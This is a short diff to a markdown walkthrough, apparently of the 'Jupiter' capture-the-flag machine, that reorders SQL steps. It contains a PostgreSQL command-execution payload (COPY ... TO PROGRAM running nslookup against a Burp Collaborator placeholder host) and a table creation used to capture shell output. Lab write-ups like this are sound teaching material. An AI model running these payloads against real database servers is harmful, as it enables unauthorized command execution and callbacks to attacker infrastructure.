@@ -249,6 +249,12 @@ To do it we only need to send three `requests`.
 
 <br />
 
+```sql 
+COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+```
+
+<br />
+
 ![9](../../../assets/images/Jupiter/9.png)
 
 <br />
@@ -258,18 +264,12 @@ To do it we only need to send three `requests`.
 <br />
 
 ```sql 
-COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+CREATE TABLE shell(output text);
 ```
 
 <br />
 
 ![10](../../../assets/images/Jupiter/10.png)
-
-<br />
-
-```sql 
-CREATE TABLE shell(output text);
-```
 
 <br />
 
